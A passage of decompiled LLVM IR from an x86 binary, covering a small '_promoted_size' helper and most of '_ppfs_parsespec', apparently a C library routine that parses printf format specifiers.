  uselistorder i32 7, { 0, 5, 6, 7, 8, 9, 10, 11, 12, 1, 3, 4, 2 }
  uselistorder i32 -8, { 20, 0, 7, 2, 3, 4, 5, 6, 8, 9, 10, 11, 19, 13, 12, 14, 1, 15, 16, 17, 18, 21, 22, 23 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_804e876, { 1, 0 }
  uselistorder label %dec_label_pc_804e85b, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e844, { 1, 0 }
  uselistorder label %dec_label_pc_804e825, { 1, 0 }
  uselistorder label %dec_label_pc_804e822, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e818, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e7b3, { 1, 0 }
  uselistorder label %dec_label_pc_804e7af, { 1, 0 }
  uselistorder label %dec_label_pc_804e795, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e87c = load i32, i32* @eax, align 4
  br label %dec_label_pc_804e883

dec_label_pc_804e883:                             ; preds = %dec_label_pc_804e883, %entry
  %v0_804e883 = phi i32 [ ptrtoint (i8** @global_var_8050c32.117 to i32), %entry ], [ %v1_804e883, %dec_label_pc_804e883 ]
  %v1_804e883 = add i32 %v0_804e883, -2
  %v1_804e886 = inttoptr i32 %v1_804e883 to i16*
  %v2_804e886 = load i16, i16* %v1_804e886, align 2
  %v3_804e886 = sext i16 %v2_804e886 to i32
  %v12_804e889 = icmp ne i32 %v3_804e886, %v0_804e87c
  %v6_804e893 = icmp ugt i32 %v1_804e883, ptrtoint (i32* @global_var_8050c1a.118 to i32)
  %or.cond = and i1 %v6_804e893, %v12_804e889
  br i1 %or.cond, label %dec_label_pc_804e883, label %dec_label_pc_804e895

dec_label_pc_804e895:                             ; preds = %dec_label_pc_804e883
  %.pre = add i32 %v0_804e883, -134548508
  %v2_804e89b = sdiv i32 %.pre, 2
  store i32 %v2_804e89b, i32* @edx, align 4
  %v1_804e89d = add i32 %v2_804e89b, ptrtoint (i8** @global_var_8050c32.117 to i32)
  %v2_804e89d = inttoptr i32 %v1_804e89d to i8*
  %v3_804e89d = load i8, i8* %v2_804e89d, align 1
  %v4_804e89d = zext i8 %v3_804e89d to i32
  ret i32 %v4_804e89d

; uselistorder directives
  uselistorder i32 %v2_804e89b, { 1, 0 }
  uselistorder i32 %v1_804e883, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8050c32.117 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e8a6 = load i32, i32* @edi, align 4
  %v0_804e8a7 = load i32, i32* @esi, align 4
  %v0_804e8a8 = load i32, i32* @ebx, align 4
  store i32 %v0_804e8a8, i32* %stack_var_-16, align 4
  %v4_804e8a8 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804e8d4 = add i32 %tmp76, 24
  %v2_804e8d4 = inttoptr i32 %v1_804e8d4 to i32*
  %v3_804e8d4 = load i32, i32* %v2_804e8d4, align 4
  store i32 %v3_804e8d4, i32* %eax.global-to-local, align 4
  %v1_804e8db = add i32 %tmp76, 16
  %v2_804e8db = inttoptr i32 %v1_804e8db to i32*
  %v3_804e8db = load i32, i32* %v2_804e8db, align 4
  %v1_804e8de = and i32 %v3_804e8db, 128
  %v2_804e8de = icmp eq i32 %v1_804e8de, 0
  store i32 %v1_804e8de, i32* %edi.global-to-local, align 4
  %v1_804e8e4 = icmp eq i1 %v2_804e8de, false
  br i1 %v1_804e8e4, label %dec_label_pc_804e8f7, label %dec_label_pc_804e8e6

dec_label_pc_804e8e6:                             ; preds = %entry
  %v2_804e8e6 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804e944.outer

dec_label_pc_804e8f1:                             ; preds = %dec_label_pc_804ea7f
  %v1_804e8f1 = add i32 %v0_804ea7f.pre.pre, 1
  store i32 %v1_804e8f1, i32* @esi, align 4
  br label %dec_label_pc_804ea8f

dec_label_pc_804e8f7:                             ; preds = %entry
  %v15_804e8a9 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e8f9

dec_label_pc_804e8f9:                             ; preds = %dec_label_pc_804e921.dec_label_pc_804e8f9_crit_edge, %dec_label_pc_804e8f7
  %v2_804e90a = phi i32 [ %v2_804e90a.pre, %dec_label_pc_804e921.dec_label_pc_804e8f9_crit_edge ], [ %v15_804e8a9, %dec_label_pc_804e8f7 ]
  %v3_804e90a = phi i32 [ %v1_804e921, %dec_label_pc_804e921.dec_label_pc_804e8f9_crit_edge ], [ 0, %dec_label_pc_804e8f7 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804e8fd = mul i32 %v3_804e90a, 4
  store i32 %v1_804e8fd, i32* @ecx, align 4
  %v2_804e904 = load i32, i32* %arg1, align 4
  store i32 %v2_804e904, i32* @edx, align 4
  %v2_804e906 = add i32 %v1_804e8fd, -4
  %v3_804e906 = add i32 %v2_804e906, %v2_804e904
  %v4_804e906 = inttoptr i32 %v3_804e906 to i32*
  %v5_804e906 = load i32, i32* %v4_804e906, align 4
  store i32 %v5_804e906, i32* %eax.global-to-local, align 4
  %v1_804e90a = trunc i32 %v5_804e906 to i8
  %v4_804e90a = add i32 %v2_804e90a, 36
  %v5_804e90a = add i32 %v4_804e90a, %v3_804e90a
  %v6_804e90a = inttoptr i32 %v5_804e90a to i8*
  store i8 %v1_804e90a, i8* %v6_804e90a, align 1
  %v0_804e90e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e90e = urem i32 %v0_804e90e, 256
  %v2_804e90e = load i32, i32* @ebx, align 4
  %v3_804e90e = and i32 %v2_804e90e, -256
  %v4_804e90e = or i32 %v3_804e90e, %v1_804e90e
  store i32 %v4_804e90e, i32* @ebx, align 4
  %v1_804e910 = mul i32 %v0_804e90e, 16777216
  %v2_804e910 = sdiv i32 %v1_804e910, 16777216
  store i32 %v2_804e910, i32* %eax.global-to-local, align 4
  %v1_804e913 = load i32, i32* @edx, align 4
  %v2_804e913 = load i32, i32* @ecx, align 4
  %v3_804e913 = add i32 %v1_804e913, -4
  %v4_804e913 = add i32 %v3_804e913, %v2_804e913
  %v5_804e913 = inttoptr i32 %v4_804e913 to i32*
  %v6_804e913 = load i32, i32* %v5_804e913, align 4
  %v17_804e913 = icmp eq i32 %v2_804e910, %v6_804e913
  %v1_804e917 = icmp eq i1 %v17_804e913, false
  br i1 %v1_804e917, label %dec_label_pc_804ec69, label %dec_label_pc_804e91d

dec_label_pc_804e91d:                             ; preds = %dec_label_pc_804e8f9
  %v3_804e91d = trunc i32 %v0_804e90e to i8
  %v4_804e91d = icmp eq i8 %v3_804e91d, 0
  br i1 %v4_804e91d, label %dec_label_pc_804e927, label %dec_label_pc_804e921

dec_label_pc_804e921:                             ; preds = %dec_label_pc_804e91d
  %v0_804e921 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e921 = add i32 %v0_804e921, 1
  store i32 %v1_804e921, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e921, 32
  br i1 %tmp, label %dec_label_pc_804e921.dec_label_pc_804e8f9_crit_edge, label %dec_label_pc_804e927

dec_label_pc_804e921.dec_label_pc_804e8f9_crit_edge: ; preds = %dec_label_pc_804e921
  %v2_804e90a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e8f9

dec_label_pc_804e927:                             ; preds = %dec_label_pc_804e921, %dec_label_pc_804e91d
  %v2_804e92c = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804e944.outer

dec_label_pc_804e944.outer:                       ; preds = %dec_label_pc_804e927, %dec_label_pc_804e8e6, %dec_label_pc_804ea61
  %v0_804e950.ph94 = phi i32 [ %v1_804ea61, %dec_label_pc_804ea61 ], [ %v2_804e8e6, %dec_label_pc_804e8e6 ], [ %v2_804e92c, %dec_label_pc_804e927 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804ea61 ], [ %tmp66, %dec_label_pc_804e8e6 ], [ %tmp66, %dec_label_pc_804e927 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804e8ea, %dec_label_pc_804ea61 ], [ 0, %dec_label_pc_804e8e6 ], [ 0, %dec_label_pc_804e927 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ea61 ], [ %v3_804e8d4, %dec_label_pc_804e8e6 ], [ %v3_804e8d4, %dec_label_pc_804e927 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804ea61 ], [ 0, %dec_label_pc_804e8e6 ], [ 0, %dec_label_pc_804e927 ]
  %v7_804e94b = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804e94b = trunc i64 %v7_804e94b to i32
  %v2_804e953 = add i32 %v8_804e94b, 80
  br label %dec_label_pc_804e944

dec_label_pc_804e944:                             ; preds = %dec_label_pc_804e944.outer, %dec_label_pc_804ea01
  %v0_804e950 = phi i32 [ %v0_804ea0e, %dec_label_pc_804ea01 ], [ %v0_804e950.ph94, %dec_label_pc_804e944.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804ea01 ], [ %stack_var_-32.1.ph, %dec_label_pc_804e944.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804ea01 ], [ %stack_var_-88.1.ph, %dec_label_pc_804e944.outer ]
  store i32 %v0_804e950, i32* @edx, align 4
  %v1_804e944 = inttoptr i32 %v0_804e950 to i8*
  %v2_804e944 = load i8, i8* %v1_804e944, align 1
  %v11_804e944 = icmp eq i8 %v2_804e944, 42
  store i32 %v0_804e950, i32* @esi, align 4
  %v1_804e949 = icmp eq i1 %v11_804e944, false
  br i1 %v1_804e949, label %dec_label_pc_804e95b, label %dec_label_pc_804e94b

dec_label_pc_804e94b:                             ; preds = %dec_label_pc_804e944
  store i32 %v8_804e94b, i32* %eax.global-to-local, align 4
  %v1_804e950 = add i32 %v0_804e950, 1
  store i32 %v1_804e950, i32* @esi, align 4
  %v0_804e953 = load i32, i32* @esp, align 4
  %v3_804e953 = add i32 %v2_804e953, %v0_804e953
  %v4_804e953 = inttoptr i32 %v3_804e953 to i32*
  store i32 0, i32* %v4_804e953, align 4
  %v0_804e975.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e95b

dec_label_pc_804e95b:                             ; preds = %dec_label_pc_804e944, %dec_label_pc_804e94b
  %v0_804e975.pre = phi i32 [ %v0_804e950, %dec_label_pc_804e944 ], [ %v0_804e975.pre.pre, %dec_label_pc_804e94b ]
  %v0_804e95b = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804e95b, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804e975.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e975

dec_label_pc_804e965:                             ; preds = %dec_label_pc_804e975
  %v1_804e965 = add i32 %v1_804e96d, -4094
  %v6_804e965 = sub i32 4093, %v1_804e96d
  %v7_804e965 = and i32 %v6_804e965, %v1_804e96d
  %v8_804e965 = icmp slt i32 %v7_804e965, 0
  %v9_804e965 = icmp eq i32 %v1_804e965, 0
  %v10_804e965 = icmp slt i32 %v1_804e965, 0
  %v3_804e96b = icmp eq i1 %v10_804e965, %v8_804e965
  %v4_804e96b = icmp eq i1 %v9_804e965, false
  %v5_804e96b = and i1 %v4_804e96b, %v3_804e96b
  br i1 %v5_804e96b, label %dec_label_pc_804e974, label %dec_label_pc_804e96d

dec_label_pc_804e96d:                             ; preds = %dec_label_pc_804e965
  %v3_804e96d = mul i32 %v1_804e96d, 10
  store i32 %v3_804e96d, i32* %eax.global-to-local, align 4
  %v2_804e970 = add i32 %v3_804e96d, -48
  %v3_804e970 = add i32 %v2_804e970, %v2_804e977
  store i32 %v3_804e970, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e974

dec_label_pc_804e974:                             ; preds = %dec_label_pc_804e965, %dec_label_pc_804e96d
  %v0_804e98f32 = phi i32 [ %v1_804e96d, %dec_label_pc_804e965 ], [ %v3_804e970, %dec_label_pc_804e96d ]
  %v4_804e97528 = phi i32 [ %v6_804e975, %dec_label_pc_804e965 ], [ %v3_804e96d, %dec_label_pc_804e96d ]
  %v1_804e974 = add i32 %v0_804e974, 1
  store i32 %v1_804e974, i32* @esi, align 4
  br label %dec_label_pc_804e975

dec_label_pc_804e975:                             ; preds = %dec_label_pc_804e95b, %dec_label_pc_804e974
  %v1_804e96d = phi i32 [ 0, %dec_label_pc_804e95b ], [ %v0_804e98f32, %dec_label_pc_804e974 ]
  %v4_804e975 = phi i32 [ %v4_804e975.pre, %dec_label_pc_804e95b ], [ %v4_804e97528, %dec_label_pc_804e974 ]
  %v0_804e974 = phi i32 [ %v0_804e975.pre, %dec_label_pc_804e95b ], [ %v1_804e974, %dec_label_pc_804e974 ]
  %v1_804e975 = inttoptr i32 %v0_804e974 to i8*
  %v2_804e975 = load i8, i8* %v1_804e975, align 1
  %v3_804e975 = zext i8 %v2_804e975 to i32
  %v5_804e975 = and i32 %v4_804e975, -256
  %v6_804e975 = or i32 %v3_804e975, %v5_804e975
  store i32 %v6_804e975, i32* %eax.global-to-local, align 4
  %v2_804e977 = sext i8 %v2_804e975 to i32
  store i32 %v2_804e977, i32* @ecx, align 4
  %v2_804e97a = mul nsw i32 %v2_804e977, 2
  %v3_804e97a = add i32 %v2_804e97a, %v0_804e95b
  %v4_804e97a = inttoptr i32 %v3_804e97a to i8*
  %v5_804e97a = load i8, i8* %v4_804e97a, align 1
  %v6_804e97a = and i8 %v5_804e97a, 8
  %v7_804e97a = icmp eq i8 %v6_804e97a, 0
  %v1_804e97f = icmp eq i1 %v7_804e97a, false
  br i1 %v1_804e97f, label %dec_label_pc_804e965, label %dec_label_pc_804e981

dec_label_pc_804e981:                             ; preds = %dec_label_pc_804e975
  %v0_804e981 = load i32, i32* @edx, align 4
  %v1_804e981 = add i32 %v0_804e981, -1
  %v2_804e981 = inttoptr i32 %v1_804e981 to i8*
  %v3_804e981 = load i8, i8* %v2_804e981, align 1
  %v12_804e981 = icmp eq i8 %v3_804e981, 37
  %v1_804e985 = icmp eq i1 %v12_804e981, false
  br i1 %v1_804e985, label %dec_label_pc_804ea18, label %dec_label_pc_804e98b

dec_label_pc_804e98b:                             ; preds = %dec_label_pc_804e981
  %v10_804e98b = icmp eq i8 %v2_804e975, 36
  %v1_804e98d = icmp eq i1 %v10_804e98b, false
  br i1 %v1_804e98d, label %dec_label_pc_804e9bf, label %dec_label_pc_804e98f

dec_label_pc_804e98f:                             ; preds = %dec_label_pc_804e98b
  %tmp89 = icmp slt i32 %v1_804e96d, 1
  br i1 %tmp89, label %dec_label_pc_804e9bf, label %dec_label_pc_804e993

dec_label_pc_804e993:                             ; preds = %dec_label_pc_804e98f
  %v4_804e993 = icmp eq i32 %stack_var_-88.1, 0
  %v1_804e998 = add i32 %v0_804e974, 1
  store i32 %v1_804e998, i32* @edx, align 4
  br i1 %v4_804e993, label %dec_label_pc_804ec69, label %dec_label_pc_804e9a1

dec_label_pc_804e9a1:                             ; preds = %dec_label_pc_804e993
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804e9a9 = sub i32 %v1_804e96d, %stack_var_-88.1
  %v8_804e9a9 = xor i32 %v1_804e96d, %stack_var_-88.1
  %v9_804e9a9 = xor i32 %v2_804e9a9, %v1_804e96d
  %v10_804e9a9 = and i32 %v9_804e9a9, %v8_804e9a9
  %v11_804e9a9 = icmp slt i32 %v10_804e9a9, 0
  %v12_804e9a9 = icmp eq i32 %v2_804e9a9, 0
  %v13_804e9a9 = icmp slt i32 %v2_804e9a9, 0
  %v3_804e9ab = icmp ne i1 %v13_804e9a9, %v11_804e9a9
  %v4_804e9ab = or i1 %v12_804e9a9, %v3_804e9ab
  %stack_var_-88.1.v0_804e9ad = select i1 %v4_804e9ab, i32 %stack_var_-88.1, i32 %v1_804e96d
  br label %dec_label_pc_804e9bb

dec_label_pc_804e9bb:                             ; preds = %dec_label_pc_804e9cf, %dec_label_pc_804e9a1, %dec_label_pc_804e9d3
  %v0_804e9bb = phi i32 [ %v1_804e998, %dec_label_pc_804e9a1 ], [ %v0_804e981, %dec_label_pc_804e9d3 ], [ %v0_804e981, %dec_label_pc_804e9cf ]
  %stack_var_-32.2 = phi i32 [ %v1_804e96d, %dec_label_pc_804e9a1 ], [ %stack_var_-32.1, %dec_label_pc_804e9d3 ], [ %stack_var_-32.1, %dec_label_pc_804e9cf ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804e9ad, %dec_label_pc_804e9a1 ], [ 0, %dec_label_pc_804e9d3 ], [ 0, %dec_label_pc_804e9cf ]
  store i32 %v0_804e9bb, i32* @esi, align 4
  br label %dec_label_pc_804e9e2

dec_label_pc_804e9bf:                             ; preds = %dec_label_pc_804e98f, %dec_label_pc_804e98b
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804e9cf, label %dec_label_pc_804e9c6

dec_label_pc_804e9c6:                             ; preds = %dec_label_pc_804e9bf
  %v10_804e9c6 = icmp eq i8 %v2_804e975, 109
  br i1 %v10_804e9c6, label %dec_label_pc_804ea18, label %dec_label_pc_804ec69

dec_label_pc_804e9cf:                             ; preds = %dec_label_pc_804e9bf
  %tmp153 = icmp ugt i32 %v0_804e974, %v0_804e981
  br i1 %tmp153, label %dec_label_pc_804e9d3, label %dec_label_pc_804e9bb

dec_label_pc_804e9d3:                             ; preds = %dec_label_pc_804e9cf
  %v1_804e9d3 = inttoptr i32 %v0_804e981 to i8*
  %v2_804e9d3 = load i8, i8* %v1_804e9d3, align 1
  %v8_804e9d3 = icmp eq i8 %v2_804e9d3, 48
  br i1 %v8_804e9d3, label %dec_label_pc_804e9bb, label %dec_label_pc_804ea18

dec_label_pc_804e9e2:                             ; preds = %dec_label_pc_804e9f3, %dec_label_pc_804e9bb
  %v0_804ea0e = phi i32 [ %v1_804e9f3, %dec_label_pc_804e9f3 ], [ %v0_804e9bb, %dec_label_pc_804e9bb ]
  %v4_804e9ec35 = phi i32 [ %v6_804e9ec, %dec_label_pc_804e9f3 ], [ %v6_804e975, %dec_label_pc_804e9bb ]
  store i32 ptrtoint ([8 x i8]* @global_var_8050c12.119 to i32), i32* %edx.global-to-local, align 4
  %v1_804e9ef = inttoptr i32 %v0_804ea0e to i8*
  br label %dec_label_pc_804e9ec

dec_label_pc_804e9ec:                             ; preds = %dec_label_pc_804e9fd, %dec_label_pc_804e9e2
  %v4_804e9ec = phi i32 [ %v4_804e9ec35, %dec_label_pc_804e9e2 ], [ %v6_804e9ec, %dec_label_pc_804e9fd ]
  %v0_804e9ee = phi i32 [ ptrtoint ([8 x i8]* @global_var_8050c12.119 to i32), %dec_label_pc_804e9e2 ], [ %v1_804e9ee, %dec_label_pc_804e9fd ]
  %v0_804e9fd = phi i32 [ 1, %dec_label_pc_804e9e2 ], [ %v2_804e9fd, %dec_label_pc_804e9fd ]
  store i32 %v0_804e9fd, i32* @ecx, align 4
  %v1_804e9ec = inttoptr i32 %v0_804e9ee to i8*
  %v2_804e9ec = load i8, i8* %v1_804e9ec, align 1
  %v3_804e9ec = zext i8 %v2_804e9ec to i32
  %v5_804e9ec = and i32 %v4_804e9ec, -256
  %v6_804e9ec = or i32 %v3_804e9ec, %v5_804e9ec
  store i32 %v6_804e9ec, i32* %eax.global-to-local, align 4
  %v1_804e9ee = add i32 %v0_804e9ee, 1
  store i32 %v1_804e9ee, i32* @edx, align 4
  %v2_804e9ef = load i8, i8* %v1_804e9ef, align 1
  %v15_804e9ef = icmp eq i8 %v2_804e9ef, %v2_804e9ec
  %v1_804e9f1 = icmp eq i1 %v15_804e9ef, false
  br i1 %v1_804e9f1, label %dec_label_pc_804e9f8, label %dec_label_pc_804e9f3

dec_label_pc_804e9f3:                             ; preds = %dec_label_pc_804e9ec
  %v1_804e9f3 = add i32 %v0_804ea0e, 1
  store i32 %v1_804e9f3, i32* @esi, align 4
  %v0_804e9f4 = load i32, i32* %edi.global-to-local, align 4
  %v2_804e9f4 = or i32 %v0_804e9f4, %v0_804e9fd
  store i32 %v2_804e9f4, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e9e2

dec_label_pc_804e9f8:                             ; preds = %dec_label_pc_804e9ec
  %v1_804e9f8 = inttoptr i32 %v1_804e9ee to i8*
  %v2_804e9f8 = load i8, i8* %v1_804e9f8, align 1
  %v3_804e9f8 = icmp eq i8 %v2_804e9f8, 0
  br i1 %v3_804e9f8, label %dec_label_pc_804ea01, label %dec_label_pc_804e9fd

dec_label_pc_804e9fd:                             ; preds = %dec_label_pc_804e9f8
  %v2_804e9fd = mul i32 %v0_804e9fd, 2
  br label %dec_label_pc_804e9ec

dec_label_pc_804ea01:                             ; preds = %dec_label_pc_804e9f8
  %v0_804ea01 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804ea05 = udiv i32 %v0_804ea01, 2
  %v1_804ea05.not = or i32 %v1_804ea05, -6
  %v1_804ea0a = xor i32 %v1_804ea05.not, 5
  store i32 %v1_804ea0a, i32* %eax.global-to-local, align 4
  %v2_804ea0c = and i32 %v1_804ea0a, %v0_804ea01
  store i32 %v2_804ea0c, i32* %edi.global-to-local, align 4
  %v1_804ea0e = add i32 %v0_804ea0e, -1
  %v2_804ea0e = inttoptr i32 %v1_804ea0e to i8*
  %v3_804ea0e = load i8, i8* %v2_804ea0e, align 1
  %v12_804ea0e = icmp eq i8 %v3_804ea0e, 37
  %v1_804ea12 = icmp eq i1 %v12_804ea0e, false
  br i1 %v1_804ea12, label %dec_label_pc_804e944, label %dec_label_pc_804ea18

dec_label_pc_804ea18:                             ; preds = %dec_label_pc_804e9d3, %dec_label_pc_804ea01, %dec_label_pc_804e981, %dec_label_pc_804e9c6
  %v0_804ea3b = phi i32 [ %v1_804e96d, %dec_label_pc_804e9c6 ], [ %v1_804e96d, %dec_label_pc_804e9d3 ], [ 0, %dec_label_pc_804ea01 ], [ %v1_804e96d, %dec_label_pc_804e981 ]
  %v1_804ea44 = phi i32 [ %v0_804e974, %dec_label_pc_804e9c6 ], [ %v0_804e974, %dec_label_pc_804e9d3 ], [ %v0_804ea0e, %dec_label_pc_804ea01 ], [ %v0_804e974, %dec_label_pc_804e981 ]
  %v0_804ea41 = phi i32 [ %v0_804e981, %dec_label_pc_804e9c6 ], [ %v0_804e981, %dec_label_pc_804e9d3 ], [ %v1_804e9ee, %dec_label_pc_804ea01 ], [ %v0_804e981, %dec_label_pc_804e981 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804e9c6 ], [ %stack_var_-32.1, %dec_label_pc_804e9d3 ], [ %stack_var_-32.2, %dec_label_pc_804ea01 ], [ %stack_var_-32.1, %dec_label_pc_804e981 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804e9c6 ], [ 0, %dec_label_pc_804e9d3 ], [ %stack_var_-88.2, %dec_label_pc_804ea01 ], [ %stack_var_-88.1, %dec_label_pc_804e981 ]
  %v1_804ea18 = inttoptr i32 %v0_804ea41 to i8*
  %v2_804ea18 = load i8, i8* %v1_804ea18, align 1
  %v11_804ea18 = icmp eq i8 %v2_804ea18, 42
  %v1_804ea1b = icmp eq i1 %v11_804ea18, false
  br i1 %v1_804ea1b, label %dec_label_pc_804ea51, label %dec_label_pc_804ea1d

dec_label_pc_804ea1d:                             ; preds = %dec_label_pc_804ea18
  %v4_804ea1d = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804ea1d, label %dec_label_pc_804ea41, label %dec_label_pc_804ea24

dec_label_pc_804ea24:                             ; preds = %dec_label_pc_804ea1d
  %v1_804ea24 = inttoptr i32 %v1_804ea44 to i8*
  %v2_804ea24 = load i8, i8* %v1_804ea24, align 1
  %v11_804ea24 = icmp eq i8 %v2_804ea24, 36
  %v1_804ea27 = icmp eq i1 %v11_804ea24, false
  br i1 %v1_804ea27, label %dec_label_pc_804ec69, label %dec_label_pc_804ea2d

dec_label_pc_804ea2d:                             ; preds = %dec_label_pc_804ea24
  %tmp91 = icmp slt i32 %v0_804ea3b, 1
  br i1 %tmp91, label %dec_label_pc_804ec69, label %dec_label_pc_804ea35

dec_label_pc_804ea35:                             ; preds = %dec_label_pc_804ea2d
  store i32 %v8_804e94b, i32* %eax.global-to-local, align 4
  %v1_804ea3a = add i32 %v1_804ea44, 1
  store i32 %v1_804ea3a, i32* @esi, align 4
  %v1_804ea3b = load i32, i32* @esp, align 4
  %v3_804ea3b = add i32 %v8_804e94b, 68
  %v4_804ea3b = add i32 %v3_804ea3b, %v1_804ea3b
  %v5_804ea3b = inttoptr i32 %v4_804ea3b to i32*
  store i32 %v0_804ea3b, i32* %v5_804ea3b, align 4
  %v0_804ea7f.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ea4c

dec_label_pc_804ea41:                             ; preds = %dec_label_pc_804ea1d
  %v1_804ea41 = add i32 %v0_804ea41, 1
  store i32 %v1_804ea41, i32* %eax.global-to-local, align 4
  %v12_804ea44 = icmp eq i32 %v1_804ea41, %v1_804ea44
  %v1_804ea46 = icmp eq i1 %v12_804ea44, false
  br i1 %v1_804ea46, label %dec_label_pc_804ec69, label %dec_label_pc_804ea4c

dec_label_pc_804ea4c:                             ; preds = %dec_label_pc_804ea41, %dec_label_pc_804ea35
  %v0_804ea7f.pre.pre.pre = phi i32 [ %v1_804ea44, %dec_label_pc_804ea41 ], [ %v0_804ea7f.pre.pre.pre.pre, %dec_label_pc_804ea35 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ea51

dec_label_pc_804ea51:                             ; preds = %dec_label_pc_804ea18, %dec_label_pc_804ea4c
  %v0_804ea7f.pre.pre = phi i32 [ %v1_804ea44, %dec_label_pc_804ea18 ], [ %v0_804ea7f.pre.pre.pre, %dec_label_pc_804ea4c ]
  %v0_804e8ea = phi i32 [ %v0_804ea3b, %dec_label_pc_804ea18 ], [ -2147483648, %dec_label_pc_804ea4c ]
  %v4_804ea51 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804ea51 = icmp eq i32 %v4_804ea51, 0
  %v1_804ea56 = icmp eq i1 %v5_804ea51, false
  %.pre = inttoptr i32 %v0_804ea7f.pre.pre to i8*
  br i1 %v1_804ea56, label %dec_label_pc_804ea7a, label %dec_label_pc_804ea5c

dec_label_pc_804ea5c:                             ; preds = %dec_label_pc_804ea51
  %v2_804ea5c = load i8, i8* %.pre, align 1
  %v11_804ea5c = icmp eq i8 %v2_804ea5c, 46
  %v1_804ea5f = icmp eq i1 %v11_804ea5c, false
  br i1 %v1_804ea5f, label %dec_label_pc_804ea73, label %dec_label_pc_804ea61

dec_label_pc_804ea61:                             ; preds = %dec_label_pc_804ea5c
  %v1_804ea61 = add i32 %v0_804ea7f.pre.pre, 1
  store i32 %v1_804ea61, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e944.outer

dec_label_pc_804ea73:                             ; preds = %dec_label_pc_804ea5c
  br label %dec_label_pc_804ea7a

dec_label_pc_804ea7a:                             ; preds = %dec_label_pc_804ea51, %dec_label_pc_804ea73
  %stack_var_-96.2 = phi i32 [ %v0_804e8ea, %dec_label_pc_804ea73 ], [ %stack_var_-96.1.ph, %dec_label_pc_804ea51 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804ea73 ], [ %v0_804e8ea, %dec_label_pc_804ea51 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8050bc0.120 to i32), i32* @edx, align 4
  %v4_804ea7f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea7f

dec_label_pc_804ea7f:                             ; preds = %dec_label_pc_804ea89, %dec_label_pc_804ea7a
  %v0_804ea89 = phi i32 [ %v1_804ea89, %dec_label_pc_804ea89 ], [ ptrtoint ([9 x i8]* @global_var_8050bc0.120 to i32), %dec_label_pc_804ea7a ]
  %v4_804ea7f = phi i32 [ %v6_804ea7f, %dec_label_pc_804ea89 ], [ %v4_804ea7f.pre, %dec_label_pc_804ea7a ]
  %v2_804ea7f = load i8, i8* %.pre, align 1
  %v3_804ea7f = zext i8 %v2_804ea7f to i32
  %v5_804ea7f = and i32 %v4_804ea7f, -256
  %v6_804ea7f = or i32 %v3_804ea7f, %v5_804ea7f
  store i32 %v6_804ea7f, i32* %eax.global-to-local, align 4
  %v3_804ea81 = inttoptr i32 %v0_804ea89 to i8*
  %v4_804ea81 = load i8, i8* %v3_804ea81, align 1
  %v15_804ea81 = icmp eq i8 %v2_804ea7f, %v4_804ea81
